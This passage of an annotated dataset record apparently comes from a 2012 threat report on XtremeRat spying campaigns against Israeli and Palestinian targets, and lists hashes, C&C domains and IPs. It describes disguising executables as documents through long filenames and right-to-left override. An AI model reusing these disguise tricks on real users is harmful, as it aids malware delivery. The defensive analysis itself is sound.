"F68F85B0FBCA450F0D5C8828063AD30D", "pos": [0, 1], "sent_id": 166, "type": "MD5"}], [{"name": "3DA8C22F5340850EE5A2C25B1D17FC27", "pos": [0, 1], "sent_id": 167, "type": "MD5"}], [{"name": "3DA8C22F5340850EE5A2C25B1D17FC27", "pos": [0, 1], "sent_id": 167, "type": "MD5"}], [{"name": "DBE2AC744A3947B6306E13EBCCB718BF", "pos": [2, 3], "sent_id": 167, "type": "MD5"}], [{"name": "DBE2AC744A3947B6306E13EBCCB718BF", "pos": [2, 3], "sent_id": 167, "type": "MD5"}], [{"name": "861C90536B3B5A4A8309ADBBFD5C4713", "pos": [0, 1], "sent_id": 168, "type": "MD5"}], [{"name": "861C90536B3B5A4A8309ADBBFD5C4713", "pos": [0, 1], "sent_id": 168, "type": "MD5"}], [{"name": "947557A55267DFFB3F85E0D7496A3679", "pos": [1, 2], "sent_id": 168, "type": "MD5"}], [{"name": "947557A55267DFFB3F85E0D7496A3679", "pos": [1, 2], "sent_id": 168, "type": "MD5"}], [{"name": "2BFE41D7FDB6F4C1E38DB4A5C3EB1211", "pos": [2, 3], "sent_id": 168, "type": "MD5"}], [{"name": "2BFE41D7FDB6F4C1E38DB4A5C3EB1211", "pos": [2, 3], "sent_id": 168, "type": "MD5"}], [{"name": "2BCDC5091C446E8B6888D802A3589E09", "pos": [0, 1], "sent_id": 169, "type": "MD5"}], [{"name": "2BCDC5091C446E8B6888D802A3589E09", "pos": [0, 1], "sent_id": 169, "type": "MD5"}], [{"name": "72FD6074915F8F123EB44B3DD475D36B", "pos": [0, 1], "sent_id": 170, "type": "MD5"}], [{"name": "72FD6074915F8F123EB44B3DD475D36B", "pos": [0, 1], "sent_id": 170, "type": "MD5"}], [{"name": "41454B390B73A45004B916B96C693312", "pos": [0, 1], "sent_id": 171, "type": "MD5"}], [{"name": "41454B390B73A45004B916B96C693312", "pos": [0, 1], "sent_id": 171, "type": "MD5"}], [{"name": "may2008.dyndns.biz", "pos": [10, 11], "sent_id": 175, "type": "Indicator"}], [{"name": "27-Oct-11", "pos": [48, 51], "sent_id": 179, "type": "Time"}], [{"name": "29-Oct-11", "pos": [0, 3], "sent_id": 180, "type": "Time"}], [{"name": "02-Nov-11", "pos": [3, 6], "sent_id": 180, "type": "Time"}], [{"name": "07-Nov-11", "pos": [6, 9], "sent_id": 180, "type": "Time"}], [{"name": "07-Nov-11", "pos": [6, 9], "sent_id": 180, "type": "Time"}], [{"name": "08-Nov-11", "pos": [0, 3], "sent_id": 182, "type": "Time"}], [{"name": "14-Nov-11", "pos": [0, 3], "sent_id": 183, "type": "Time"}], [{"name": "19-Nov-11", "pos": [3, 6], "sent_id": 183, "type": "Time"}], [{"name": "30-Nov-11", "pos": [0, 3], "sent_id": 184, "type": "Time"}], [{"name": "17-Dec-11", "pos": [0, 3], "sent_id": 185, "type": "Time"}], [{"name": "23-Dec-11", "pos": [3, 6], "sent_id": 185, "type": "Time"}], [{"name": "01-Jan-12", "pos": [6, 9], "sent_id": 185, "type": "Time"}], [{"name": "03-Jan-12", "pos": [0, 3], "sent_id": 186, "type": "Time"}], [{"name": "12-May-12", "pos": [3, 6], "sent_id": 186, "type": "Time"}], [{"name": "16-May-12", "pos": [6, 9], "sent_id": 186, "type": "Time"}], [{"name": "19-May-12", "pos": [9, 12], "sent_id": 186, "type": "Time"}], [{"name": "29-May-12", "pos": [12, 15], "sent_id": 186, "type": "Time"}], [{"name": "02-Jun-12", "pos": [15, 18], "sent_id": 186, "type": "Time"}], [{"name": "02-Jun-12", "pos": [15, 18], "sent_id": 186, "type": "Time"}], [{"name": "07-Jun-12", "pos": [21, 24], "sent_id": 186, "type": "Time"}], [{"name": "09-Jun-12", "pos": [24, 27], "sent_id": 186, "type": "Time"}], [{"name": "09-Jun-12", "pos": [24, 27], "sent_id": 186, "type": "Time"}], [{"name": "25-Jun-12", "pos": [30, 33], "sent_id": 186, "type": "Time"}], [{"name": "25-Jun-12", "pos": [30, 33], "sent_id": 186, "type": "Time"}], [{"name": "10-Jul-12", "pos": [36, 39], "sent_id": 186, "type": "Time"}], [{"name": "12-Jul-12", "pos": [39, 42], "sent_id": 186, "type": "Time"}], [{"name": "02-Aug-12", "pos": [42, 45], "sent_id": 186, "type": "Time"}], [{"name": "02-Aug-12", "pos": [42, 45], "sent_id": 186, "type": "Time"}], [{"name": "14-Aug-12", "pos": [48, 51], "sent_id": 186, "type": "Time"}], [{"name": "29-Aug-12", "pos": [51, 54], "sent_id": 186, "type": "Time"}], [{"name": "04-Sep-12", "pos": [54, 57], "sent_id": 186, "type": "Time"}], [{"name": "10-Sep-12", "pos": [57, 60], "sent_id": 186, "type": "Time"}], [{"name": "18-Sep-12", "pos": [60, 63], "sent_id": 186, "type": "Time"}], [{"name": "27-Sep-12", "pos": [63, 66], "sent_id": 186, "type": "Time"}], [{"name": "28-Sep-12", "pos": [66, 69], "sent_id": 186, "type": "Time"}], [{"name": "02-Oct-12", "pos": [69, 72], "sent_id": 186, "type": "Time"}], [{"name": "03-Oct-12", "pos": [72, 75], "sent_id": 186, "type": "Time"}], [{"name": "21-Oct-12", "pos": [75, 78], "sent_id": 186, "type": "Time"}], [{"name": "21-Oct-12", "pos": [75, 78], "sent_id": 186, "type": "Time"}], [{"name": "24-Oct-12", "pos": [81, 84], "sent_id": 186, "type": "Time"}], [{"name": "25-Oct-12", "pos": [84, 87], "sent_id": 186, "type": "Time"}], [{"name": "25-Oct-12", "pos": [84, 87], "sent_id": 186, "type": "Time"}], [{"name": "25-Oct-12", "pos": [84, 87], "sent_id": 186, "type": "Time"}], [{"name": "31-Oct-12", "pos": [93, 96], "sent_id": 186, "type": "Time"}], [{"name": "03-Nov-12", "pos": [96, 99], "sent_id": 186, "type": "Time"}], [{"name": "B455426811B82CB412952F63D911D2A8", "pos": [0, 1], "sent_id": 193, "type": "MD5"}], [{"name": "E431634699D7E5025ECDF7B51A800620", "pos": [1, 2], "sent_id": 193, "type": "MD5"}], [{"name": "4DC0BCDCFB3F3D794175B21872A76079", "pos": [0, 1], "sent_id": 198, "type": "MD5"}], [{"name": "91FC9D1B635FDEE4E56AEC32688A0E6C", "pos": [2, 3], "sent_id": 198, "type": "MD5"}], [{"name": "cebc8b51d51e442e2af8c86e70c8adf4", "pos": [4, 5], "sent_id": 198, "type": "MD5"}], [{"name": "D9D1B0C467FA4999DEF6CD53447F1221", "pos": [5, 6], "sent_id": 200, "type": "MD5"}], [{"name": "A1187DE4C4B88E560D46940B820A6228", "pos": [0, 1], "sent_id": 202, "type": "MD5"}], [{"name": "841565C67006E6A0A450C48054CF348C", "pos": [8, 9], "sent_id": 202, "type": "MD5"}]], "labels": [{"r": "P21", "h": 18, "t": 20, "evidence": [30, 31]}, {"r": "P21", "h": 21, "t": 23, "evidence": [31, 32]}, {"r": "P21", "h": 25, "t": 27, "evidence": [33]}, {"r": "P21", "h": 28, "t": 31, "evidence": [34]}, {"r": "P21", "h": 41, "t": 44, "evidence": [38, 39]}, {"r": "P21", "h": 45, "t": 47, "evidence": [40, 41]}, {"r": "P21", "h": 48, "t": 49, "evidence": [43, 44]}, {"r": "P21", "h": 140, "t": 139, "evidence": [102]}, {"r": "P2", "h": 146, "t": 143, "evidence": [108, 109]}, {"r": "P2", "h": 148, "t": 144, "evidence": [109]}, {"r": "P2", "h": 150, "t": 145, "evidence": [109, 110]}, {"r": "P2", "h": 164, "t": 154, "evidence": [111, 112]}, {"r": "P2", "h": 166, "t": 155, "evidence": [111, 113]}, {"r": "P2", "h": 167, "t": 156, "evidence": [111, 114]}, {"r": "P2", "h": 168, "t": 157, "evidence": [112, 115]}, {"r": "P2", "h": 169, "t": 158, "evidence": [112, 116]}, {"r": "P2", "h": 170, "t": 159, "evidence": [112, 117]}, {"r": "P2", "h": 171, "t": 160, "evidence": [112, 118]}, {"r": "P2", "h": 172, "t": 161, "evidence": [112, 119]}, {"r": "P2", "h": 173, "t": 162, "evidence": [112, 120]}, {"r": "P2", "h": 174, "t": 163, "evidence": [112, 121]}], "title": "201211NormanXtremeRat", "sents": [["Systematic", "cyber", "attacks", "against", "Israeli", "and", "Palestinian", "targets", "going", "on", "for", "a", "year"], ["By", "Snorre", "Fagerland", "Principal", "Security", "Researcher", "\u00a9", "Norman", "AS", ",", "November", "2012"], ["Summary"], ["We", "have", "observed", "multiple", "probable", "malware", "attacks", "against", "Israeli", "and", "Palestinian", "targets", "."], ["These", "attacks", "are", "likely", "performed", "by", "the", "same", "attacker", ",", "as", "the", "malware", "in", "question", "communicate", "with", "the", "same", "command-", "and", "control", "structures", ",", "and", "in", "many", "cases", "are", "signed", "using", "the", "same", "digital", "certificate", "."], ["These", "attacks", "have", "been", "ongoing", "for", "at", "least", "a", "year", ";", "seemingly", "first", "focused", "on", "Palestinians", ",", "then", "Israelis", "."], ["The", "attacker", "is", "unknown", "at", "this", "point", ",", "but", "the", "purpose", "is", "assumed", "to", "be", "espionage", "/", "surveillance", "."], ["\u00a9", "Norman", ",", "November", "2012", "2", "Introduction"], ["Recently", ",", "media", "(", "1", ")", "reported", "of", "a", "targeted", "attack", "against", "the", "Israeli", "government", ",", "in", "the", "form", "of", "emails", "purporting", "to", "come", "from", "IDF", "Chief", "of", "Staff", "Benny", "Gantz", "with", "a", "malicious", "attachment", "."], ["This", "was", "an", "interesting", "development", "\u2013", "Israel", "has", ",", "as", "far", "as", "we", "know", ",", "not", "been", "very", "targeted", "by", "spear", "phishing", "attacks", "like", "this", "."], ["In", "the", "following", "text", "we", "will", "usually", "be", "referring", "to", "the", "actual", "malware", "files", "we", "uncovered", "by", "their", "MD5", "hash", ",", "which", "is", "a", "number", "that", "uniquely", "(", "well", ",", "uniquely", "enough", ")", "identifies", "the", "file", "in", "question", "."], ["\u00a9", "Norman", ",", "November", "2012", "3"], ["The", "initial", "reported", "malware", "While", "we", "do", "n\u2019t", "have", "visibility", "into", "Israeli", "government", "mails", ",", "we", "do", "receive", "a", "lot", "of", "suspicious", "executable", "files", ",", "and", "a", "little", "digging", "gives", "results", "."], ["We", "found", "one", "file", "which", "matched", "the", "reports", ":", "\"", "IDF", "strikes", "militants", "in", "Gaza", "Strip", "following", "rocket", "barrage.doc----------------------------------------------.scr", "\"", "."], ["This", "is", "an", "executable", "file", ",", "but", "the", "icon", "looks", "like", "a", "document", "icon", ",", "and", "the", "very", "long", "name", "makes", "the", "*", ".scr", "extension", "hard", "to", "spot", "-", "particularly", "if", "the", "executable", "comes", "packaged", "in", "an", "archive", ",", "as", "was", "reportedly", "the", "case", "here", "."], ["This", "executable", "itself", "is", "a", "WinRAR", "selfextracting", "(", "SFX", ")", "archive", ",", "which", "contains", "several", "other", "files", ":"], ["\u2022", "\u2022", "\u2022", "Word.exe", ",", "an", "XtremeRat", "backdoor", "executable"], ["2.ico", ",", "an", "icon", "file", "barrage.doc", ",", "an", "innocent", "document", "containing", "pictures", "(", "above", ")"], ["XtremeRat", "is", "a", "commercially", "available", "backdoor", "trojan", "which", "has", "been", "used", "in", "many", "attacks", ",", "targeted", "and", "otherwise", ",", "over", "the", "years", "."], ["It", "gained", "some", "notoriety", "in", "connection", "with", "attacks", "against", "Syrian", "activists", ";", "along", "with", "other", "off", "-", "the", "-", "shelf", "trojans", "such", "as", "BlackShades", "and", "DarkComet", "."], ["\u00a9", "Norman", ",", "November", "2012", "4"], ["The", "digital", "signature"], ["An", "interesting", "feature", "of", "this", "exact", "XtremeRat", "is", "that", "it", "is", "digitally", "signed", "\u2013", "seemingly", "by", "Microsoft", ":", "The", "certificate", "chain", "ends", "in", "an", "untrusted", "(", "faked", ")", "root", "certificate", ";", "so", "it", "will", "not", "validate", "properly", "."], ["Nevertheless", "the", "certificate", "is", "useful", "for", "us", ",", "as", "it", "can", "be", "used", "to", "find", "related", "cases", "."], ["All", "certificates", "are", "issued", "with", "a", "serial", "number", "which", "normally", "is", "quite", "unique", ",", "as", "it", "is", "supposed", "to", "be", "an", "identifier", "within", "the", "scope", "of", "its", "issuer", "."], ["So", ",", "querying", "our", "databases", "for", "this", "particular", "faked", "certificate", "returns", "a", "number", "of", "files", "which", "are", "probably", "the", "products", "of", "our", "Israel", "-", "hostile", "attacker", "."], ["These", "files", "were", "received", "in", "intervals", "through", "the", "fall", "and", "summer", ",", "going", "back", "to", "May", "2012", ",", "and", "reveal", "more", "hints", "about", "targets", "."], ["Several", "of", "them", "are", "self", "extracting", "archives", "containing", "extra", "files", ",", "such", "as", "documents", ",", "links", "and", "even", "video", "."], ["The", "following", "pages", "display", "some", "of", "the", "bait", "information", "the", "new", "files", "contain", "."], ["\u00a9", "Norman", ",", "November", "2012", "5", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file"], ["66DDF27517985A75B2317231B46A6F62", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file", "4A06D9989A8C3A9967C2011E5BAF3010"], ["\u201c", "Report.doc", "......................................................", "..........................................................................", ".............", "exe", "\u201d", "\u00a9", "Norman", ",", "November", "2012", "6", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file", "15FC009D9CAAA8F11D6C3DA2B69EA06E"], ["\u201c", "Silence", "of", "the", "Jews", "make", "the", "Church", "of", "the", "Nativity", "of", "the", "Palestinians.doc-----------.scr", "\u201d"], ["Found", "in", "Israel", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file", "940B3ACDF1E26FCCCF74A5A0359FB079", "\u201c", "IDF", "NEWS[RTLO]cod", ".", "SCR", "\u201d", "\u00a9", "Norman", ",", "November", "2012", "7", "3gp", "video", ",", "contained", "in", "SFX", "RAR", "file"], ["9C39D6F52E1E1BE5AE61BAB90971D054", "\u201c", "A", "Rood", "Awakening", "!", "Michael", "Rood", ".3gp--------------------------------------.scr", "\u201d"], ["Found", "in", "Israel", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file", "9D144A828F757A90B86976EF0C906B3F", "\u00a9", "Norman", ",", "November", "2012", "8", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file", "D14E0A3D408065B1551F2827B50B83CA", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file"], ["C8202523F35295E8BC8CC1731EDB0559"], ["\u00a9", "Norman", ",", "November", "2012", "9", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file"], ["C21D7165B25CAF65D7F92FF758C1B5B1"], ["\u201c", "The", "first", "conference", "of", "Dr.", "Mohamed", "Morsi", ",", "after", "winning.doc---------------.scr", "\u201d", "YouTube", "URL", "contained", "in", "SFX", "RAR", "file"], ["5B740B4623B2D1049C0036A6AAE684B0"], ["\u201c", "\u202b\u05dd\u05d9\u05d9\u05dc\u05e2\u05e0", "\u05e8\u05d5\u05e9\u05e7\u05dc", "\u05da\u05d9\u05d0", "\u05d9\u05d1\u05d9\u05d8\u05de\u05e8\u05d5\u05e4\u05e0\u05d9\u05d0", "\u05dd\u05e0\u05d9\u05d7", "\u05dd\u05d9\u05d8\u05e8\u05e1\u202c", "\u202b[\u05ea\u05d5\u05d9\u05d0\u05d1\u05e6\u202cRTLO]----------------------------------------.wmv------------------.scr", "\u201d"], ["Found", "in", "Israel", "\u00a9", "Norman", ",", "November", "2012", "10", "Word", "document", ",", "contained", "in", "SFX", "RAR", "file"], ["72fd6074915f8f123eb44b3dd475d36b"], ["\u201c", "TShehab[RTLO]cod.scr", "\u201d"], ["Found", "in", "Israel", "\u00a9", "Norman", ",", "November", "2012", "11", "Command", "&", "Control"], ["The", "involved", "malwares", "connect", "to", "external", "hosts", "controlled", "by", "the", "attackers", "."], ["These", "belong", "to", "various", "DynDNS", "services", ",", "and", "at", "the", "time", "of", "writing", "resolve", "to", "IP", "addresses", "located", "with", "hosting", "services", "in", "the", "US", "."], ["Samples", "in", "yellow", "connecting", "to", "C&C", "hosts", "(", "green", ")", "."], ["All", "are", "digitally", "signed", "and", "connected", "through", "the", "blue", "certificate", "node", "in", "the", "middle", "."], ["This", "is", "where", "the", "trail", "could", "have", "ended", "."], ["However", ",", "there", "are", "still", "clues", "to", "look", "at", "\u2013", "for", "example", ",", "what", "other", "executables", "connect", "to", "these", "C&C", "hosts", "."], ["This", "time", ",", "digging", "into", "our", "Malware", "Analyzer", "G2", "(", "MAG2", ")", "databases", "shows", "that", "there", "is", "more", "malware", "talking", "to", "this", "infrastructure", ",", "and", "these", "bots", "again", "connect", "to", "more", "C&C", "domains", "."], ["These", "new", "malwares", "are", "also", "predominantly", "XtremeRats", "."], ["However", ",", "they", "have", "been", "in", "circulation", "for", "a", "longer", "time", "\u2013", "all", "the", "way", "back", "to", "October", "2011", "."], ["I", "think", "it", "is", "logical", "to", "assume", "that", "all", "these", "have", "been", "part", "of", "a", "medium", "/", "large", "surveillance", "operation", "."], ["\u00a9", "Norman", ",", "November", "2012", "12", "When", "updated", "with", "this", "information", "the", "plot", "now", "looks", "like", "this", ":", "Same", "as", "previous", "illustration", ",", "where", "new", "unsigned", "samples", "are", "shown", "to", "be", "related", "through", "the", "usage", "of", "the", "same", "C&C", "infrastructure", "."], ["Colours", "have", "changed", "\u2013", "now", "the", "certificate", "is", "green", ",", "the", "C&C", "servers", "are", "yellow", ",", "the", "samples", "are", "blue", ",", "while", "IP", "addresses", "are", "purple", "."], ["These", "IP", "addresses", "can", "be", "considered", "examples", "\u2013", "they", "change", "regularly", "."], ["Several", "of", "these", "domains", "appear", "to", "be", "hosted", "together", "."], ["For", "example", "(", "at", "the", "time", "of", "writing", "):", "108.171.108.190", "is", "pointed", "to", "by", "may2008.dyndns.info", ",", "menu.dyndns.biz", ",", "flashsoft.no-ip.biz", ",", "monagameel.chickenkiller.com", ",", "powerhost.zapto.org", "108.171.124.13", "is", "pointed", "to", "by", "helpme.no-ip.biz", ",", "mjed10.no-ip.info", "69.80.101.244", "is", "pointed", "to", "by", "good.zapto.org", ",", "hint.zapto.org", ",", "hint1.zapto.org", ",", "natco1.no-ip.net", ",", "natco2.no-ip.net", ",", "natco3.no-ip.net", ",", "natco4.no-ip.net", ",", "loading.myftp.org", ",", "skype.servemp3.com", ","], ["test.cable-modem.org"], ["These", "addresses", "tend", "to", "change", "."], ["Typically", ",", "every", "couple", "of", "days", "a", "new", "IP", "configuration", "is", "introduced", "for", "some", "boxes", ",", "while", "others", "may", "remain", "static", "\u2013", "such", "as", "the", "host", "lokia.mine.nu", ",", "which", "has", "resolved", "to", "69.80.107.129", "since", "we", "started", "examining", "the", "case", "."], ["As", "mentioned", ",", "the", "IP", "addresses", "in", "use", "have", "belonged", "to", "mostly", "US", "-", "based", "hosting", "services", "\u2026", "at", "least", "recently", "."], ["\u00a9", "Norman", ",", "November", "2012", "13"], ["If", "we", "go", "further", "back", "in", "time", "(", "towards", "spring", "of", "2012", ")", "most", "of", "the", "domains", "used", "resolved", "to", "IP", "addresses", "in", "the", "range", "188.161", "."], ["*", "."], ["This", "range", "is", "located", "in", "Gaza", "and", "belongs", "to", "a", "provider", "headquartered", "in", "Ramallah", "in", "the", "West", "Bank", ":", "Palestinian", "Territory", ",", "Occupied", "Gaza", "Palestine", "Telecommunications", "Company", "(", "paltel", ")", ",", "ASN", ":", "AS12975"], ["We", "have", "also", "to", "a", "lesser", "extent", "seen", "IP", "addresses", "in", "use", "belonging", "to", "another", "Paltel", "division", ":", "Palestinian", "Territory", ",", "Occupied", "Gaza", "Hadara", "Technologies", "Private", "Shareholding", "Company", ",", "ASN", ":", "AS15975"], ["What", "is", "behind", "these", "IP", "addresses", "is", "hard", "to", "establish", "."], ["It", "is", "possible", "that", "they", "are", "hacked", "boxes", ",", "and", "as", "such", "not", "give", "much", "valid", "information", "."], ["If", "that", "were", "the", "case", ",", "one", "might", "have", "expected", "greater", "IP", "range", "and", "geographical", "distribution", ",", "but", "nothing", "is", "certain", "."], ["Our", "databases", "also", "show", "that", "there", "is", "much", "more", "malware", "talking", "to", "these", "providers", "through", "many", "other", "DynDNS", "domains", "."], ["Some", "of", "these", "are", "probably", "also", "related", "to", "this", "case", ",", "but", "as", "we", "have", "no", "evidence", "linking", "the", "cases", ",", "these", "malwares", "have", "not", "been", "included", "in", "this", "paper", "."], ["It", "is", "however", "interesting", "to", "note", "the", "hostnames", "some", "of", "these", "connect", "to", "\u2013", "like", "\u201c", "terroristttt.noip.biz", "\u201d", "."], ["\u00a9", "Norman", ",", "November", "2012", "14"], ["The", "plot", "thickens"], ["So", "far", ",", "the", "impression", "is", "of", "an", "attack", "actor", "attempting", "to", "gather", "information", "from", "Israelis", "."], ["Then", "something", "happens", "that", "throws", "this", "picture", "in", "disarray", "."], ["A", "series", "of", "samples", "show", "up", "that", "do", "not", "follow", "the", "pattern", "."], ["They", "apparently", "do", "not", "target", "Israelis", "."], ["Instead", "they", "use", "Arabic", "language", "and", "refer", "to", "Palestinian", "issues", "."], ["Word", "document", "contained", "in", "EXE", "file"], ["FC17F3B2E2C7F5F24D35899D95B8C4A6"], ["This", "document", "in", "Arabic", "claims", "that", "Mahmoud", "Abbas", "is", "threatened", "by", "assassination", "by", "Mossad", "if", "he", "does", "not", "stop", "his", "reconciliation", "policy", "towards", "Hamas", "."], ["The", "image", "is", "taken", "from", "a", "news", "story", "about", "Abbas", "speaking", "at", "a", "meeting", "in", "Ramallah", "."], ["\u00a9", "Norman", ",", "November", "2012", "15", "MP4", "video", "contained", "in", "EXE", "file", "2AAD951DBECB6D4715B306B337CA5C34"], ["The", "sample", "containing", "this", "video", "is", "digitally", "signed", "in", "the", "same", "way", "as", "the", "initial", "samples", ",", "but", "the", "baiting", "angle", "is", "different", "."], ["Instead", "of", "showing", "information", "interesting", "for", "an", "Israeli", "audience", ",", "the", "video", "contains", "a", "music", "piece", "critical", "of", "Mahmoud", "Abbas", ",", "claiming", "that", "he", "is", "not", "working", "for", "the", "good", "of", "the", "Palestinian", "people", "."], ["\u00a9", "Norman", ",", "November", "2012", "16", "Word", "document", "contained", "in", "SFX", "ZIP", "file"], ["B4F5BFC0AB0CC3D6B7A6B9653784DE56"], ["Found", "in", "Palestine"], ["This", "document", "revolves", "around", "the", "prisoner", "exchange", "deal", "with", "the", "Israeli", "government", "over", "the", "Israeli", "soldier", "Gilad", "Shalit", ",", "held", "hostage", "by", "Hamas", "for", "over", "five", "years", "."], ["JPEG", "image", "contained", "in", "EXE", "file", "0AA7B256D2DCC8BD3914F895B134B225"], ["This", "image", "appears", "purportedly", "to", "be", "of", "Gilad", "Shalit", "in", "his", "hostage", "cell", "."], ["This", "could", "be", "aimed", "at", "Israelis", ",", "but", "the", "image", "itself", "has", "been", "mostly", "shown", "on", "Arabic", "/", "Palestinian", "sites", "like", "www.shehab.ps", ",", "a", "news", "agency", "located", "in", "Gaza", "."], ["\u00a9", "Norman", ",", "November", "2012", "17", "Word", "document", "contained", "in", "EXE", "file", "926235FCF7B91442A405B5760A0729EB"], ["This", "document", "is", "an", "interview", "with", "the", "former", "Palestinian", "ambassador", "and", "Member", "of", "Parliament", "Nabil", "Amr", "."], ["He", "is", "known", "to", "have", "been", "critical", "of", "Arafat", "and", "later", "Abbas", "."], ["\u00a9", "Norman", ",", "November", "2012", "18"], ["We", "also", "see", "attacks", "apparently", "against", "Palestinian", "targets", "without", "being", "able", "to", "tie", "them", "up", "against", "the", "already", "mentioned", "attack", "/", "C&C", "structure", "."], ["For", "example", ",", "a", "file", "received", "by", "us", "as", "\u201c", "d.exe", "\u201d", ",", "(", "MD5", "1f1e9958440d773c34415d9eb6334b25", ")", ",", "found", "in", "Palestine", "Nov", "17th", "last", "year", ",", "shows", "a", "PDF", "document", "with", "content", "seemingly", "taken", "from", "\u201c", "Palestine", "Now", "\u201d", "(", "www.paltimes.net", "):", "PDF", "document", "contained", "in", "the", "EXE", "file"], ["1F1E9958440D773C34415D9EB6334B25"], ["Found", "in", "Palestine", "\u00a9", "Norman", ",", "November", "2012", "19", "Document", "metadata"], ["Most", "of", "the", "bait", "attachments", "are", "Word", "documents", ",", "and", "Word", "documents", "can", "contain", "metadata"], ["(", "typically", "the", "usernames", "of", "the", "creator", "and", "the", "one", "who", "last", "saved", "the", "document", ")", "."], ["It", "is", "possible", "to", "scrub", "these", "details", ",", "but", "our", "attackers", "seem", "to", "have", "forgotten", "this", "\u2013", "or", "inserted", "faked", "data", "."], ["Palestinian", "baits", ":", "Hmas.doc", ":"], ["484hhh.doc", ":", "Word.doc", ":", "Created", "by", "\u201c", "Hitham", "\u201d", ",", "saved", "by", "\u201c", "anar", "\u201d", "Created", "by", "\u201c", "Hitham", "\u201d", ",", "saved", "by", "\u201c", "Ayman", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "Tohan", "\u201d", "date", "Oct", "12th", "2011", "date"], ["Nov", "27th", "2011", "date", "Feb", "18th", "2012", "Israeli", "baits", ":", "word.doc", ":", "IDF", "NEWS.doc", ":", "Brotherhood.doc", ":"], ["detl.doc", ":", "Advisor.doc", ":", "IDF.doc", ":", "System.doc", ":", "York.doc", ":", "barrage.doc", ":", "shehab.doc", ":", "Created", "by", "\u201c", "ahmed", "\u201d", ",", "saved", "by", "\u201c", "aert", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "aert", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "aert", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "aert", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "HinT", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "aert", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "HinT", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "HinT", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "HinT", "\u201d"], ["Created", "and", "saved", "by", "\u201c", "HinT", "\u201d", "date", "May", "14th", "2012"], ["date", "May", "26th", "2012"], ["date", "Jun", "24th", "2012", "date", "Jun", "29th", "2012", "date"], ["Jul", "29th", "2012", "date", "Aug", "1st", "2012", "date", "Aug", "5th", "2012"], ["date", "Oct", "16th", "2012"], ["date"], ["Oct", "24th", "2012"], ["date", "Oct", "31st", "2012", "There", "seems", "to", "be", "a", "number", "of", "people", "involved", "in", "creating", "these", "bait", "files", "."], ["The", "dates", "also", "roughly", "coincide", "with", "the", "apparent", "shift", "in", "IP", "ranges", "(", "Appendix", "B", ")", ",", "from", "first", "being", "located", "in", "Gaza", ",", "to", "being", "located", "internationally", "."], ["\u00a9", "Norman", ",", "November", "2012", "20", "Conclusion"], ["We", "have", "uncovered", "a", "substantial", "number", "of", "malware", "executables", "that", "contain", "information", "seemingly", "tailored", "at", "Israelis", "and", "Palestinians", "."], ["We", "have", "the", "impression", "that", "a", "cybersurveillance", "operation", "is", "underway", "(", "and", "is", "probably", "still", "ongoing", "-", "most", "recent", "sample", "created", "Oct.", "31", ")", "which", "was", "first", "mainly", "focused", "on", "Palestinian", "targets", ",", "then", "shifted", "towards", "Israel", "."], ["The", "reason", "for", "the", "shift", "is", "unknown", "."], ["Maybe", "it", "was", "planned", "all", "along", ";", "or", "caused", "by", "changes", "in", "the", "political", "climate", ";", "or", "maybe", "the", "first", "half", "of", "the", "operation", "found", "data", "that", "caused", "the", "target", "change", "."], ["This", "analysis", "is", "almost", "exclusively", "based", "on", "the", "executable", "files", "themselves", "."], ["We", "have", "very", "little", "information", "about", "actual", "infections", "."], ["The", "only", "documented", "case", "is", "the", "Benny", "Gantz", "-", "themed", "email", "which", "triggered", "the", "investigation", "."], ["We", "consider", "it", "likely", "that", "other", "attacks", "have", "been", "modeled", "the", "same", "way", ",", "using", "attachments", "in", "email", "."], ["These", "attachments", "may", "often", "have", "consisted", "of", "the", "described", "malicious", "files", "inside", "archives", "like", "RAR", "or", "ZIP", "."], ["The", "attacker", "is", "still", "unknown", "to", "us", "."], ["There", "are", "probably", "several", "actors", "that", "could", "have", "an", "interest", "in", "the", "regional", "politics", ",", "as", "the", "various", "powerblocks", "in", "the", "region", "are", "manifold", "and", "conflicted", "."], ["By", "using", "largely", "off", "-", "the", "-", "shelf", "malware", ",", "the", "cost", "of", "mounting", "such", "an", "operation", "is", "considerably", "lower", "than", "for", "those", "who", "do", "their", "own", "malware", "development", "."], ["\u00a9", "Norman", ",", "November", "2012", "21", "References", "1", "."], ["Ravid", ",", "Barak", "."], ["Haaretz.com", ":", "Israel", "'s", "Foreign", "Ministry", "targeted", "by", "computer", "virus", "bearing", "IDF", "chief", "'s", "name", "."], ["[", "Online", "]", "http://www.haaretz.com/blogs/diplomania/israel-s-foreign-ministry-targeted-bycomputer-virus-bearing-idf-chief-s-name.premium-1.472278", "."], ["\u00a9", "Norman", ",", "November", "2012", "22", "Appendix", "A", ":", "C&C", "hostnames", "may2008.dyndns.info", "menu.dyndns.biz", "flashsoft.no-ip.biz", "monagameel.chickenkiller.com", "hatamaya.chickenkiller.com", "powerhost.zapto.org", "helpme.no-ip.biz", "mjed10.no-ip.info"], ["good.zapto.org", "hint.zapto.org", "hint1.zapto.org", "natco1.no-ip.net", "natco2.no-ip.net", "natco3.no-ip.net", "natco4.no-ip.net", "loading.myftp.org", "skype.servemp3.com", "test.cable-modem.org", "idf.blogsite.org", "javaupdate.no-ip.info", "lokia.mine.nu", "www.hint-sms.com", "owner.no-ip.biz"], ["remoteback.no-ip.biz", "ramadi.no-ip.biz"], ["The", "likelihood", "that", "there", "are", "more", "names", "involved", "is", "large", "."], ["There", "is", "for", "example", "a", "domain", "natco5.no-ip.net", "which", "resolves", "to", "the", "same", "IP", "\u2019s", "as", "the", "rest", "of", "the", "series", ",", "but", "we", "have", "not", "seen", "the", "malware", "which", "uses", "it", "\u2013", "yet", "."], ["\u00a9", "Norman", ",", "November", "2012", "23", "Appendix", "B", ":", "C&C", "Timeline"], ["MD5"], ["A5DE87646EE943CD1F448A67FDBE2817", "F982401E46864F640BCAEDC200319109"], ["EC5B360F5FF6251A08A14A2E95C4CAA4", 